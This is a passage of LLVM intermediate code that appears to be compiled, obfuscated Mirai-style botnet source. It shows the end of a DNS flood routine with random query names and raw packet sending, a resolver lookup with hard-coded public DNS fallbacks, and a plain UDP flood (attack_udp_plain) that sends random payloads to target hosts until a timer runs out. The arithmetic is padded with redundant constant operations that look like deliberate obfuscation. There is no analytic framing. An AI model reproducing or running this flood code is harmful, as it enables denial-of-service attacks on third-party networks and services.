  %410 = trunc i32 %408 to i16
  %411 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 1
  store i16 %410, i16* %412, align 2
  br label %413

; <label>:413:                                    ; preds = %400, %396
  %414 = load i16, i16* %20, align 2
  %415 = zext i16 %414 to i32
  %416 = icmp eq i32 %415, 65535
  br i1 %416, label %417, label %430

; <label>:417:                                    ; preds = %413
  %418 = call i32 @rand_next()
  %419 = xor i32 %418, -1
  %420 = xor i32 65535, -1
  %421 = xor i32 -698990820, -1
  %422 = or i32 %419, %420
  %423 = or i32 -698990820, %421
  %424 = xor i32 %422, -1
  %425 = and i32 %424, %423
  %426 = and i32 %418, 65535
  %427 = trunc i32 %425 to i16
  %428 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %429 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %428, i32 0, i32 0
  store i16 %427, i16* %429, align 2
  br label %430

; <label>:430:                                    ; preds = %417, %413
  %431 = load i8*, i8** %39, align 8
  %432 = load i8, i8* %21, align 1
  %433 = zext i8 %432 to i32
  call void @rand_alphastr(i8* %431, i32 %433)
  %434 = load i8*, i8** %39, align 8
  %435 = load i8, i8* %21, align 1
  %436 = zext i8 %435 to i64
  %437 = getelementptr inbounds i8, i8* %434, i64 %436
  store i8 0, i8* %437, align 1
  %438 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 7
  store i16 0, i16* %439, align 2
  %440 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %441 = bitcast %struct.iphdr* %440 to i16*
  %442 = call zeroext i16 @checksum_generic(i16* %441, i32 20)
  %443 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 7
  store i16 %442, i16* %444, align 2
  %445 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %446 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %445, i32 0, i32 3
  store i16 0, i16* %446, align 2
  %447 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %448 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %449 = bitcast %struct.udphdr* %448 to i8*
  %450 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %451 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %450, i32 0, i32 2
  %452 = load i16, i16* %451, align 2
  %453 = load i8, i8* %21, align 1
  %454 = zext i8 %453 to i64
  %455 = add i64 21, 3339641318369513877
  %456 = add i64 %455, %454
  %457 = sub i64 %456, 3339641318369513877
  %458 = add i64 21, %454
  %459 = add i64 %457, -5197401275341913581
  %460 = add i64 %459, 2
  %461 = sub i64 %460, -5197401275341913581
  %462 = add i64 %457, 2
  %463 = load i32, i32* %23, align 4
  %464 = sext i32 %463 to i64
  %465 = sub i64 0, %464
  %466 = sub i64 %461, %465
  %467 = add i64 %461, %464
  %468 = sub i64 0, %466
  %469 = sub i64 0, 4
  %470 = add i64 %468, %469
  %471 = sub i64 0, %470
  %472 = add i64 %466, 4
  %473 = trunc i64 %471 to i32
  %474 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %447, i8* %449, i16 zeroext %452, i32 %473)
  %475 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 3
  store i16 %474, i16* %476, align 2
  %477 = load i32, i32* %24, align 4
  %478 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %479 = load i32, i32* %11, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i64 %480
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i32 0, i32 0
  %483 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %482, i32 0, i32 2
  %484 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %483, i32 0, i32 0
  store i32 %477, i32* %484, align 4
  %485 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i32 0, i32 1
  %487 = load i16, i16* %486, align 2
  %488 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %489 = load i32, i32* %11, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %491, i32 0, i32 0
  %493 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %492, i32 0, i32 1
  store i16 %487, i16* %493, align 2
  %494 = load i32, i32* %12, align 4
  %495 = load i8*, i8** %35, align 8
  %496 = load i8, i8* %21, align 1
  %497 = zext i8 %496 to i64
  %498 = sub i64 0, %497
  %499 = sub i64 41, %498
  %500 = add i64 41, %497
  %501 = sub i64 0, 2
  %502 = sub i64 %499, %501
  %503 = add i64 %499, 2
  %504 = load i32, i32* %23, align 4
  %505 = sext i32 %504 to i64
  %506 = sub i64 0, %505
  %507 = sub i64 %502, %506
  %508 = add i64 %502, %505
  %509 = add i64 %507, -3005525373339421651
  %510 = add i64 %509, 4
  %511 = sub i64 %510, -3005525373339421651
  %512 = add i64 %507, 4
  %513 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %514 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %515 = load i32, i32* %11, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i64 %516
  %518 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %517, i32 0, i32 0
  %519 = bitcast %struct.sockaddr_in* %518 to %struct.sockaddr*
  store %struct.sockaddr* %519, %struct.sockaddr** %513, align 8
  %520 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %521 = load %struct.sockaddr*, %struct.sockaddr** %520, align 8
  %522 = call i64 @sendto(i32 %494, i8* %495, i64 %511, i32 16384, %struct.sockaddr* %521, i32 16)
  br label %523

; <label>:523:                                    ; preds = %430
  %524 = load i32, i32* %11, align 4
  %525 = sub i32 0, %524
  %526 = sub i32 0, 1
  %527 = add i32 %525, %526
  %528 = sub i32 0, %527
  %529 = add nsw i32 %524, 1
  store i32 %528, i32* %11, align 4
  br label %340

; <label>:530:                                    ; preds = %340
  %531 = call i64 @time(i64* null) #6
  %532 = load i32, i32* %25, align 4
  %533 = sext i32 %532 to i64
  %534 = icmp sgt i64 %531, %533
  br i1 %534, label %535, label %536

; <label>:535:                                    ; preds = %530
  br label %537

; <label>:536:                                    ; preds = %530
  br label %339

; <label>:537:                                    ; preds = %535, %102, %96, %90
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 38)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 38, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %105

; <label>:28:                                     ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %91, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %98

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %91

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %71, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %71, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 0, 1
  %68 = add i32 %66, %67
  %69 = sub nsw i32 %66, 1
  %70 = icmp eq i32 %65, %68
  br i1 %70, label %71, label %90

; <label>:71:                                     ; preds = %64, %60, %56
  %72 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %74 = load i32, i32* %4, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = sub i32 %77, 1525405054
  %80 = sub i32 %79, %78
  %81 = add i32 %80, 1525405054
  %82 = sub nsw i32 %77, %78
  call void @util_memcpy(i8* %72, i8* %76, i32 %81)
  %83 = load i32, i32* %6, align 4
  %84 = load i32, i32* %4, align 4
  %85 = sub i32 0, %84
  %86 = add i32 %83, %85
  %87 = sub nsw i32 %83, %84
  %88 = sext i32 %86 to i64
  %89 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %88
  store i8 0, i8* %89, align 1
  store i8 1, i8* %9, align 1
  br label %98

; <label>:90:                                     ; preds = %64
  br label %91

; <label>:91:                                     ; preds = %90, %49
  %92 = load i32, i32* %6, align 4
  %93 = sub i32 0, %92
  %94 = sub i32 0, 1
  %95 = add i32 %93, %94
  %96 = sub i32 0, %95
  %97 = add nsw i32 %92, 1
  store i32 %96, i32* %6, align 4
  br label %30

; <label>:98:                                     ; preds = %71, %30
  %99 = load i8, i8* %9, align 1
  %100 = icmp ne i8 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  br label %117

; <label>:104:                                    ; preds = %98
  br label %105

; <label>:105:                                    ; preds = %104, %15
  br label %106

; <label>:106:                                    ; preds = %105, %0
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  switch i32 %108, label %117 [
    i32 0, label %109
    i32 1, label %111
    i32 2, label %113
    i32 3, label %115
  ]

; <label>:109:                                    ; preds = %106
  %110 = call i32 @htonl(i32 134744072) #7
  store i32 %110, i32* %1, align 4
  br label %117

; <label>:111:                                    ; preds = %106
  %112 = call i32 @htonl(i32 1246898730) #7
  store i32 %112, i32* %1, align 4
  br label %117

; <label>:113:                                    ; preds = %106
  %114 = call i32 @htonl(i32 1074151430) #7
  store i32 %114, i32* %1, align 4
  br label %117

; <label>:115:                                    ; preds = %106
  %116 = call i32 @htonl(i32 67240450) #7
  store i32 %116, i32* %1, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %113, %111, %109, %106, %101
  %118 = load i32, i32* %1, align 4
  ret i32 %118
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = sub i64 0, %53
  %55 = sub i64 %51, %54
  %56 = add nsw i64 %51, %53
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %19, align 4
  %58 = load i16, i16* %15, align 2
  %59 = zext i16 %58 to i32
  %60 = icmp eq i32 %59, 65535
  br i1 %60, label %61, label %64

; <label>:61:                                     ; preds = %5
  %62 = call i32 @rand_next()
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %15, align 2
  br label %67

; <label>:64:                                     ; preds = %5
  %65 = load i16, i16* %15, align 2
  %66 = call zeroext i16 @htons(i16 zeroext %65) #7
  store i16 %66, i16* %15, align 2
  br label %67

; <label>:67:                                     ; preds = %64, %61
  store i32 0, i32* %11, align 4
  br label %68

; <label>:68:                                     ; preds = %183, %67
  %69 = load i32, i32* %11, align 4
  %70 = load i8, i8* %7, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %189

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %75 = load i8**, i8*** %12, align 8
  %76 = load i32, i32* %11, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i16, i16* %14, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp eq i32 %80, 65535
  br i1 %81, label %82, label %91

; <label>:82:                                     ; preds = %73
  %83 = call i32 @rand_next()
  %84 = trunc i32 %83 to i16
  %85 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 0
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %89, i32 0, i32 1
  store i16 %84, i16* %90, align 2
  br label %100

; <label>:91:                                     ; preds = %73
  %92 = load i16, i16* %14, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %92) #7
  %94 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %95 = load i32, i32* %11, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 0
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %98, i32 0, i32 1
  store i16 %93, i16* %99, align 2
  br label %100

; <label>:100:                                    ; preds = %91, %82
  %101 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %102 = load i32*, i32** %13, align 8
  %103 = load i32, i32* %11, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  store i32 %101, i32* %105, align 4
  %106 = icmp eq i32 %101, -1
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %236

; <label>:108:                                    ; preds = %100
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %109, align 4
  %110 = load i16, i16* %15, align 2
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %110, i16* %111, align 2
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 0, i32* %113, align 4
  %114 = load i32*, i32** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %120 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %120, %struct.sockaddr** %119, align 8
  %121 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %122 = load %struct.sockaddr*, %struct.sockaddr** %121, align 8
  %123 = call i32 @bind(i32 %118, %struct.sockaddr* %122, i32 16) #6
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %108
  br label %126

; <label>:126:                                    ; preds = %125, %108
  %127 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i64 %129
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i32 0, i32 2
  %132 = load i8, i8* %131, align 4
  %133 = zext i8 %132 to i32
  %134 = icmp slt i32 %133, 32
  br i1 %134, label %135, label %164

; <label>:135:                                    ; preds = %126
  %136 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 1
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @ntohl(i32 %141) #7
  %143 = call i32 @rand_next()
  %144 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 2
  %149 = load i8, i8* %148, align 4
  %150 = zext i8 %149 to i32
  %151 = lshr i32 %143, %150
  %152 = sub i32 %142, -768027596
  %153 = add i32 %152, %151
  %154 = add i32 %153, -768027596
  %155 = add i32 %142, %151
  %156 = call i32 @htonl(i32 %154) #7
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 0
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 2
  %163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %162, i32 0, i32 0
  store i32 %156, i32* %163, align 4
  br label %164

; <label>:164:                                    ; preds = %135, %126
  %165 = load i32*, i32** %13, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i32, i32* %165, i64 %167
  %169 = load i32, i32* %168, align 4
  %170 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %171 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %172 = load i32, i32* %11, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i32 0, i32 0
  %176 = bitcast %struct.sockaddr_in* %175 to %struct.sockaddr*
  store %struct.sockaddr* %176, %struct.sockaddr** %170, align 8
  %177 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %178 = load %struct.sockaddr*, %struct.sockaddr** %177, align 8
  %179 = call i32 @connect(i32 %169, %struct.sockaddr* %178, i32 16)
  %180 = icmp eq i32 %179, -1
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %164
  br label %182

; <label>:182:                                    ; preds = %181, %164
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* %11, align 4
  %185 = sub i32 %184, 214669286
  %186 = add i32 %185, 1
  %187 = add i32 %186, 214669286
  %188 = add nsw i32 %184, 1
  store i32 %187, i32* %11, align 4
  br label %68

; <label>:189:                                    ; preds = %68
  br label %190

; <label>:190:                                    ; preds = %235, %189
  store i32 0, i32* %11, align 4
  br label %191

; <label>:191:                                    ; preds = %222, %190
  %192 = load i32, i32* %11, align 4
  %193 = load i8, i8* %7, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp slt i32 %192, %194
  br i1 %195, label %196, label %229

; <label>:196:                                    ; preds = %191
  %197 = load i8**, i8*** %12, align 8
  %198 = load i32, i32* %11, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8*, i8** %197, i64 %199
  %201 = load i8*, i8** %200, align 8
  store i8* %201, i8** %25, align 8
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  br i1 %203, label %204, label %212

; <label>:204:                                    ; preds = %196
  %205 = load i8*, i8** %25, align 8
  %206 = load i16, i16* %16, align 2
  %207 = zext i16 %206 to i32
  call void @rand_alphastr(i8* %205, i32 %207)
  %208 = load i8*, i8** %25, align 8
  %209 = load i16, i16* %16, align 2
  %210 = zext i16 %209 to i64
  %211 = getelementptr inbounds i8, i8* %208, i64 %210
  store i8 0, i8* %211, align 1
  br label %212

; <label>:212:                                    ; preds = %204, %196
  %213 = load i32*, i32** %13, align 8
  %214 = load i32, i32* %11, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i32, i32* %213, i64 %215
  %217 = load i32, i32* %216, align 4
  %218 = load i8*, i8** %25, align 8
  %219 = load i16, i16* %16, align 2
  %220 = zext i16 %219 to i64
  %221 = call i64 @send(i32 %217, i8* %218, i64 %220, i32 16384)
  br label %222

; <label>:222:                                    ; preds = %212
  %223 = load i32, i32* %11, align 4
  %224 = sub i32 0, %223
  %225 = sub i32 0, 1
  %226 = add i32 %224, %225
  %227 = sub i32 0, %226
  %228 = add nsw i32 %223, 1
  store i32 %227, i32* %11, align 4
  br label %191

; <label>:229:                                    ; preds = %191
  %230 = call i64 @time(i64* null) #6
  %231 = load i32, i32* %19, align 4
  %232 = sext i32 %231 to i64
  %233 = icmp sgt i64 %230, %232
  br i1 %233, label %234, label %235

; <label>:234:                                    ; preds = %229
  br label %236

; <label>:235:                                    ; preds = %229
  br label %190

; <label>:236:                                    ; preds = %234, %107
  ret void
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %20, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %26

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %14
  %16 = sub i64 0, %13
  %17 = add i64 %15, %16
  %18 = sub i64 0, %17
  %19 = add i64 %14, %13
  store i64 %18, i64* %5, align 8
  br label %20

; <label>:20:                                     ; preds = %9
  %21 = load i32, i32* %4, align 4
  %22 = sub i32 %21, 1501548233
  %23 = sub i32 %22, 2
  %24 = add i32 %23, 1501548233
  %25 = sub i32 %21, 2
  store i32 %24, i32* %4, align 4
  br label %6

; <label>:26:                                     ; preds = %6
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, 1
  br i1 %28, label %29, label %39

; <label>:29:                                     ; preds = %26
  %30 = load i16*, i16** %3, align 8
  %31 = load i16, i16* %30, align 2
  %32 = trunc i16 %31 to i8
  %33 = sext i8 %32 to i64
  %34 = load i64, i64* %5, align 8
  %35 = add i64 %34, 2539971614433267547
  %36 = add i64 %35, %33
  %37 = sub i64 %36, 2539971614433267547
  %38 = add i64 %34, %33
  store i64 %37, i64* %5, align 8
  br label %39

; <label>:39:                                     ; preds = %29, %26
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 16
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 %42, -1
  %44 = xor i64 65535, -1
  %45 = xor i64 3319350091298849916, -1
  %46 = or i64 %43, %44
  %47 = or i64 3319350091298849916, %45
  %48 = xor i64 %46, -1
  %49 = and i64 %48, %47
  %50 = and i64 %42, 65535
  %51 = sub i64 %41, 5096670604551750067
  %52 = add i64 %51, %49
  %53 = add i64 %52, 5096670604551750067
  %54 = add i64 %41, %49
  store i64 %53, i64* %5, align 8
  %55 = load i64, i64* %5, align 8
  %56 = lshr i64 %55, 16
  %57 = load i64, i64* %5, align 8
  %58 = sub i64 %57, -5933342221776271308
  %59 = add i64 %58, %56
  %60 = add i64 %59, -5933342221776271308
  %61 = add i64 %57, %56
  store i64 %60, i64* %5, align 8
  %62 = load i64, i64* %5, align 8
  %63 = xor i64 %62, -1
  %64 = and i64 -1, %63
  %65 = xor i64 -1, -1
  %66 = and i64 %62, %65
  %67 = or i64 %64, %66
  %68 = xor i64 %62, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
